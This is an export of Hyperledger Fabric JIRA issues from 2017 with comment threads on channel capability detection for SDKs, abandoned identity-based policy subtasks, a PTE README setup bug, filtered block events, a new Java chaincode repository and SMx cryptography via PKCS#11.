 ;;;","12/Aug/17 5:28 AM;jyellick;The fact that we are creating tasks and submitting CRs would imply to me that the design document is complete and there is consensus on its handling all of the possible cases.  Not to speak for [~yacovm] as well, but I do not believe we would agree that either of these conditions have been met.;;;","12/Aug/17 6:00 AM;binhn;[~jyellick]  We are certainly not following a waterfall model. Try something out and see where we end up. ;;;","05/Sep/17 11:37 PM;rickr;[https://docs.google.com/document/d/1CbB8dR0GNnHi7UekIDpsySCBXkPTtKk0m53CIzJbU-A/edit#heading=h.4atsg7w1xphx]

 

3.2 Protocol Version
 The current protocol version is in ChannelHeader.Version. This design will not use this field; however, we will not remove the field just yet. We can deprecate if we don’t actually need it.

Some SDK sets ChannelHeader.Version to 1, but neither the Peer nor Orderer checks this version field, so the SDK may ignore this field in v1.1.

 

By this I'm taking this to be a _NO-OP_ as a SDK todo.;;;","11/Sep/17 11:23 PM;rickr;[~jyellick] Still not understanding what the impact for the SDKs will be for this on v1.1 delivery.  The version change seemed to be a NOOP.  Last heard it was decided to be not used.;;;","12/Sep/17 5:09 AM;jyellick;[~rickr] Since we still don't have any intended use for the {{version}} field of the transaction nor anywhere else, I see this as a no-op for the SDK.;;;","26/Sep/17 1:00 AM;ChristopherFerris;I added to review-needed so that we can come to consensus on our approach for this. there are outstanding CRs but think thathere is still disagreement on implementation strategy. Getting votes will sort that out.;;;","26/Sep/17 1:03 AM;kchristidis;Along the same lines, can we either modify the Google Doc or create a new one that captures exactly what the outstanding CRs implement? (Still early on in the review process, but my understanding is that there's a delta between the doc and the CRs.);;;","28/Sep/17 11:01 PM;greg.haskins;I dont yet have an opinion on what the right mechanism/requirements/behavior should be, but I recognize the importance of the concept.;;;","30/Sep/17 12:59 AM;ChristopherFerris;This has the requisite votes to proceed.;;;","30/Sep/17 1:50 AM;jyellick;I have taken as a  TODO to update the description of this JIRA to reflect the current design in the CRs and will try to get to it soon.;;;","30/Sep/17 2:00 AM;JonathanLevi;[~jyellick] this will be very helpful (== you rock!);;;","30/Sep/17 8:09 AM;jyellick;(Done with the update to the description, please feel free to edit and or post questions regarding it here);;;","06/Dec/17 10:30 PM;denyeart;[~jyellick]
[~rickr] brought up a good question.  How should clients such as SDKs determine if a certain peer or orderer is at 1.0 level, at 1.1 level but working in 1.0 compatibility mode due to channel config, or at 1.1 level with 1.1 capabilities enabled?

More specifically,

* Should the SDK ask a peer/orderer its version?  For example if peer is at 1.1 level but 1.1 capabilities have not been enabled on the channel, can the SDK still call new 1.1 features on the peer that are not hidden behind the capabilities config (e.g. the new Deliver API)?  If so I think we'll need an API on peer and orderer to get the version.
* Or should SDK simply look at the channel capabilities and treat all peers/orderers based on the enabled capabilities on the channel.  That is, if 1.1 capability is not enabled on channel, treat all peers/orderers as if they are 1.0.  And if 1.1 capability is enabled on channel, treat all peers/orderers as if they are 1.1.  Actually it would not be this simple, as the SDK would have to look at both /Channel capabilities and /Channel/Application capabilities to determine the peer's total capabilities.

Has this been thought through already, or do we need a new ""design task"" to figure this out?;;;","06/Dec/17 10:38 PM;yacovm;I would like to piggyback on [~denyeart] 's question and verify that the [peer CLI|https://gerrit.hyperledger.org/r/#/c/15461/45/peer/chaincode/resources.go@129]'s approach is OK:
 It queries the new API from CSCC (get config tree) and if it returns a non error response it means the capability is enabled.
 I think it is trivial for the peer to check locally if the capability is enabled on the channel and return an error if not.;;;","07/Dec/17 2:10 AM;jyellick;[~yacovm] I actually think there is a slight problem in the peer CLI's approach.  The new CSCC API is currently made available regardless of channel config version, and in fact, since CSCC is not channel scoped, I'm not certain that it's possible to do so.

With [~aambati]'s CR, if a peer is queried for the new CSCC {{GetConfigTree}} function, and the peer binary is a v1.1, it will respond successfully.  Of course if the peer is a v1.0 binary, it will respond with an error.  So it's fairly easy to detect a peer which only supports the old mechanism.

The question becomes how to detect a v1.1 peer binary whether the channel is operating in a v1.1 mode.  What clients could do today with no modifications to the peer, is to look at the channel config returned as part of {{GetConfigTree}}, then look at the capabilities defined in the channel, and proceed from there.  This has the benefit of not exposing any new API, but the downside of requiring the client to gain some knowledge of how to extract the capabilities from the channel config.  If we are okay with that approach, then I'm not sure a new design task is warranted.  On the other hand, if we want to add new API surface, I would suggest we open one.

So, with the ""no changes"" approach, it would be the client's duty to inspect the channel config returned by a v1.1 peer binary to see if the application v1.1 capability is enabled or not.  Then proceed from there.  This is what I would propose.;;;","07/Dec/17 3:03 AM;yacovm;{quote}[~yacovm] I actually think there is a slight problem in the peer CLI's approach. The new CSCC API is currently made available regardless of channel config version, and in fact, since CSCC is not channel scoped, I'm not certain that it's possible to do so.
{quote}
 
 # The CSCC can decide whether to return an error or to return an OK status. The peer CLI parses this and detects if it is an application error or not.
 # The CSCC isn't channel scoped, but the client passes the channel in the parameter.

 
{quote} 

With [~aambati]'s CR, if a peer is queried for the new CSCC {{GetConfigTree}} function, and the peer binary is a v1.1, it will respond successfully. Of course if the peer is a v1.0 binary, it will respond with an error. So it's fairly easy to detect a peer which only supports the old mechanism.
{quote}
 

Right. I'm saying it needs to be changed to adapt to the channel version too, and it can be done quite easily so.

 
{quote} 

The question becomes how to detect a v1.1 peer binary whether the channel is operating in a v1.1 mode. What clients could do today with no modifications to the peer, is to look at the channel config returned as part of {{GetConfigTree}}, then look at the capabilities defined in the channel, and proceed from there. This has the benefit of not exposing any new API, but the downside of requiring the client to gain some knowledge of how to extract the capabilities from the channel config. If we are okay with that approach, then I'm not sure a new design task is warranted. On the other hand, if we want to add new API surface, I would suggest we open one.
{quote}
 

I honestly don't see why we can't just have the peer return an error if the resource config isn't enabled in the channel? We enable the resource config via a channel config, so it's not like we need that API before we move the channel to the resource config mode.

Also - if the channel isn't in the resource config mode then there is no reason to use that GetConfig API.

What am I missing here?;;;","07/Dec/17 4:06 AM;jyellick;{quote}
I honestly don't see why we can't just have the peer return an error if the resource config isn't enabled in the channel? We enable the resource config via a channel config, so it's not like we need that API before we move the channel to the resource config mode.
Also - if the channel isn't in the resource config mode then there is no reason to use that GetConfig API.
What am I missing here?
{quote}

Sure, if we'd prefer, we could modify the API to return an error if the channel does not have a v1.1 capability.  This would make the current CLI code and current CSCC implementation mesh together just fine.  It was an unfair statement to say there is a problem with the CLI's approach, a more correct statement would have been to say ""the current CLI CR and the current CSCC API do not handle the case where the peer binary has been upgraded, but the channel has not.""

The reason why I suggested this other approach was to answer Dave's question more directly of ""How can the client tell what capabilities are on?""  If the new CSCC API were made available for non v1.1 capable channels (as it is today), then the client could use this to determine the capabilities of even pre-v1.1 capable channels.;;;","07/Dec/17 6:49 AM;denyeart;Ok, let me write down the generalized logic that SDK and clients in general could utilize for any release. (1.1) could be replaced with any future release number. [~rickr] [~harrisob@us.ibm.com] Please review:

* For any Fabric release, clients need to understand which of the (1.1) channel 'capabilities' may impact their behavior.  Note, for 1.1 the list is in FAB-5999 and should also get into release notes. As of now, the only known capability that impacts client behavior is the new lifecycle (not yet in FAB-5999 since not yet merged).
* For (1.1) capabilities that impact their behavior, the client will call GetConfigTree (on peer) or can retrieve the latest config block via Deliver (on orderer), and inspect the channel config which contains capabilities level (channel, orderer, or application scope depending on the specific capability). Depending on the capabilities level, client interacts accordingly. 
* The channel capabilities level can be cached locally in client. If a compatibility-sensitive call starts failing, client can refresh cache by getting channel config (channel may have enabled (1.1) capabilities in the meantime).
* An error upon the GetConfigTree call can be interpreted to mean that the peer is a 1.0 binary and therefore no (1.1) capabilities are enabled on the channel.
* Client does not need to check each orderer/peer binary level. For new (1.1) server APIs that are not hidden behind channel 'capabilities', the client simply attempts the call on the server.  On down-level (1.0) servers, the call would return an error. Client should handle as any other error.;;;",,,,,,,,,,,,,,,,,
Create utility to convert signed data to valid identities,FAB-5558,19636,17831,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,01/Aug/17 3:04 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Aug/17 4:34 AM,,,,WON'T FIX,,fabric-orderer,,,,,,0,,,,,,,,,angelo.decaro,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya9z:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 11:09 AM;angelo.decaro;So, what should be the behaviour when a duplicate is found or and identity is not well-formed? May you describe the compatibility issues also? Thanks :);;;","08/Aug/17 11:48 AM;jyellick;After much discussion on RocketChat:

https://chat.hyperledger.org/channel/fabric-crypto?msg=bGSxXmraiuXZjDiCd

it was concluded that although perhaps the v1.0 behavior of dropping malformed identities, identities not in the channel, and identities without signature may notbe idea, we must stick with it for compatibility reasons.

Thus, in the CR, all errors are treated as non-fatal.  Strictly speaking, there is no need for the function to return an error, but the interest of less factoring later if ever one is returned, the signature includes one.;;;","22/Aug/17 4:35 AM;jyellick;This CR has been abandoned because some crypto frameworks like identity mixer require that the signature be present to verify an identity, so decoupling them is unfortunately not possible.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify cauthdsl to take identities instead of signed data,FAB-5559,19637,17831,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,01/Aug/17 3:05 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Aug/17 4:35 AM,,,,WON'T FIX,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyaa7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Aug/17 4:35 AM;jyellick;This CR has been abandoned because some crypto frameworks like identity mixer require that the signature be present to verify an identity, so decoupling them is unfortunately not possible.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow msp manager to be instantiated empty,FAB-5560,19638,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,01/Aug/17 3:05 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.1,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyaaf:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Switch policy framework to be identity based,FAB-5561,19639,17831,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,01/Aug/17 3:05 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Aug/17 4:35 AM,,,,WON'T FIX,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyaan:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Aug/17 4:35 AM;jyellick;This CR has been abandoned because some crypto frameworks like identity mixer require that the signature be present to verify an identity, so decoupling them is unfortunately not possible.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network setup in PTE README fails,FAB-5562,19640,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,ynamiki,ynamiki,01/Aug/17 3:26 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,29/Nov/17 11:32 PM,v1.0.0,,,,,fabric-quality,,,,,,0,PTE,,,,,,"Steps in ""Creating a local Fabric network"" section of test/tools/PTE/README.md cause an error.
docker-compose-e2e.yaml, the document says to use, does not provide a container named ""cli"".

{noformat}
$ ./network_setup.sh up # COMPOSE_FILE=docker-compose-e2e.yaml
...
Creating network ""e2ecli_default"" with the default driver
Creating orderer.example.com
Creating peer0.org1.example.com
Creating ca_peerOrg1
Creating ca_peerOrg2
Creating peer1.org1.example.com
Creating peer0.org2.example.com
Creating peer1.org2.example.com
Error: No such container: cli
{noformat}",fabric tag v1.0.0,denyeart,dongming,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzyaav:",,,,,,,,,,,,,,,,,,,,,,,denyeart,dongming,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,release-1.1,release-1.2,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.3,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,true,"04/Aug/17 6:10 AM;dongming;In the network_setup.sh, need to comment out

#docker logs -f cli

when choosing docker-compose-e2e.yaml

Moreover, this is just a scrip error message and has no effect on any docker container or the network.;;;","04/Aug/17 6:11 AM;dongming;Will update README in next release.;;;","27/Nov/17 1:18 PM;denyeart;[~dongming] Can you push a fix?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create/utilize FilteredBlock and FilteredTransaction protos,FAB-5568,19686,19504,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,01/Aug/17 11:59 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Oct/17 4:50 AM,v1.0.0,,,v1.1.1,,fabric-peer,,,,,,0,,,,,,,"Rough sketch of FilteredBlockEvent proto for protos/peer/events.proto
{code:java}
FilteredBlock
   -> repeated FilteredTransaction filtered_transaction
      -> string txid
      -> ChaincodeEvent ccevent
         -> string txid
         -> string ccid
         -> string ccEventName
         -> bytes payload - nilled out in this filtered transaction{code}",,rickr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyah3:",,,,,,,,,,,,,,,,,,,,,,,rickr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Aug/17 11:46 PM;rickr;No Fix Version set here.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement ACL on eventhub for Block and FilteredBlock events (WILL NOT DO),FAB-5569,19687,19504,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wlahti,wlahti,02/Aug/17 12:00 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Sep/17 12:24 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyahb:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Sep/17 12:25 AM;wlahti;This JIRA and the discussion around it led to the creation of the channel service: https://jira.hyperledger.org/browse/FAB-5695. ACL will not be implemented for the eventhub because the eventhub was never designed for this type of use. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement registration for signed/unsigned Block and FilteredBlock events,FAB-5570,19688,22028,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wlahti,wlahti,02/Aug/17 12:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Jan/18 1:16 AM,,,,Abandoned,,fabric-peer,,,,,,0,,,,,,,The eventhub currently sends unsigned block and filtered block events to listening clients. Some clients may wish/expect that any events they receive are signed by the peer. The server should allow clients to register not only for the events themselves but whether or not the events should be signed by the peer. ,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyahj:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add a general Readme for using the repo,FAB-5571,19690,19622,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,scottz,latitiah,latitiah,02/Aug/17 1:33 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Nov/17 9:31 PM,,,,,,,,,,,,0,,,,,,,"[https://gerrit.hyperledger.org/r/#/c/12945/]

There may end up being some assumptions for using this repo. For example, hyperledger fabric images and binaries may need to already be built for use with the tests in the fabric-test repo. These prerequisites need to be outlined.

We could borrow some info from: ../fabric-test/regression/daily/README.md

Also, have pointers to the corresponding readmes for each of the test frameworks and tools used.

Add notes for items like this reminder: When pulling from the fabric-test repo, remember to perform: `git submodule update --init --recursive` in order to pull the code located in the submodules.",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5545,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyahr:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"11/Aug/17 10:57 PM;latitiah;To update submodules after initial checkout:

{code:None}
git submodule foreach git pull origin master
{code}

;;;","14/Oct/17 3:26 AM;scottz;The initial Readme is done, but after we finish FAB-5545, we will need to provide modified instructions or a script explaining how to build the images and binaries in the repositories which we are including as submodules (or possibly instead how to obtain them, if they are all stored in Nexus).;;;","17/Nov/17 9:31 PM;scottz;https://jira.hyperledger.org/browse/FAB-6995 - for publishing images

https://jira.hyperledger.org/browse/FAB-6439 - README changes;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Create a new repo ""fabric-chaincode-java""",FAB-5573,19692,,Task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,jwagantall,sanchezl,sanchezl,02/Aug/17 3:00 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Aug/17 5:02 AM,,,,Future,,fabric-build,,,,,,0,,,,,,,"Based on discussed in RC: [https://chat.hyperledger.org/channel/fabric-ci?msg=Y84TnmqSwjhAJXWdp]

Create a new repository called ""fabric-chaincode-java"", and set up the following as initial committers:
• Srinivasan Muralidharan <[muralisr@us.ibm.com|mailto:muralisr@us.ibm.com]>
• Luis Sanchez <[sanchezl@us.ibm.com|mailto:sanchezl@us.ibm.com]>

with 1-vote merge policy please",,jwagantall,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCN-322,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyai7:",,,,,,,,,,,,,,,,,,,,,,,jwagantall,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Aug/17 4:03 AM;jwagantall;Created now and the 2 team members have been invited to join the group:

_hyperledger-gerrit-fabric-chaincode-java-committers_

[https://gerrit.hyperledger.org/r/#/admin/projects/fabric-chaincode-java]

 ;;;","02/Aug/17 5:35 AM;jwagantall;Jenkins, nexus and nexus3 has been configured to be able to push binaries now.. 

 

Please use fabric-chaincode-java-settings for mvn settings file. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"SMx implemented by Hardware, using PKCS#11 APIs",FAB-5575,19884,19521,Sub-task,In Progress,FAB,Fabric,software,denyeart,,,Medium,,warm3snow,warm3snow,warm3snow,02/Aug/17 6:33 PM,03/Jan/23 5:27 PM,28/Oct/23 3:00 AM,,v1.0.0,,,v1.0.0,,fabric-crypto,,,,,,2,Security,should,v1.0,,,,"在中国，加密标准是SM2，SM3和SM4等。在商业应用方面，软件应满足一定的安全级别，尤其是在金融、银行和证券行业。
*附上设计*
文档。",,flyinox,guolidong,hello2mao,matingwei,silentspark,vpaprots,warm3snow,wutongtree,yuci,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6524,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Aug/17 10:31 AM;warm3snow;SMx impl in Fabric.pdf;https://jira.hyperledger.org/secure/attachment/11817/SMx+impl+in+Fabric.pdf",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybm7:",,,,,,,,,,,,,,,,,,,,,,,flyinox,guolidong,hello2mao,matingwei,silentspark,vpaprots,warm3snow,wutongtree,yuci,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Aug/17 2:14 AM;vpaprots;Creating a new BCCSP? No issues myself with that, thats what BCCSP was created for, but I am not one of the maintainers. There are several soft spots in the current BCCSP design that we need to revisit, which might cause you churn, if you were to start implementing today..
 * Factory code needs some rethinking on how it picks up BCCSPs (i.e. do we _really_ have to call out every BCCSP by name?)
 * Where this code lives: crypto providers is getting beyond what the fabric does. Can we make things easier to plug, but host BCCSP implementations elsewhere?
 * As Fabric evolves, we will need more algorithms (today only use ECDSA). Those interfaces are lightly tested in BCCSP or non-existant
 ** Ciphering
 ** Key Derivation
 ** Key Agreement
 ** KEK
 ** ...

[~mastersingh24] [~adc] FYI;;;","04/Aug/17 5:03 PM;warm3snow;There is no need to create a new BCCSP.  As a matter of fact, this is just an implementation of  BCCSP with SMx functionality, which will not only support international crypto standards but also China crypto standards. When comes to use, modify _peer/core.yaml_ and _orderer/orderer.yaml_  as belows:

 

----------

BCCSP: Select which crypto implementation or library to use for the
 # blockchain crypto service provider.
 BCCSP:
 Default: SMxFactory

----------

Of course, it's ok only to implement SM2 and merge the code to current BCCSP. If so, there is no need to change _core.yaml_ and _orderer.yaml_ files.

Crypto providers' code is a library, just like libsofthsm.so, which will be provided by cryptographic vendors.

 If SMx mechanisms'  identifiers of PKCS#11 are the same, we don't  have to change any code when use different HSM.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
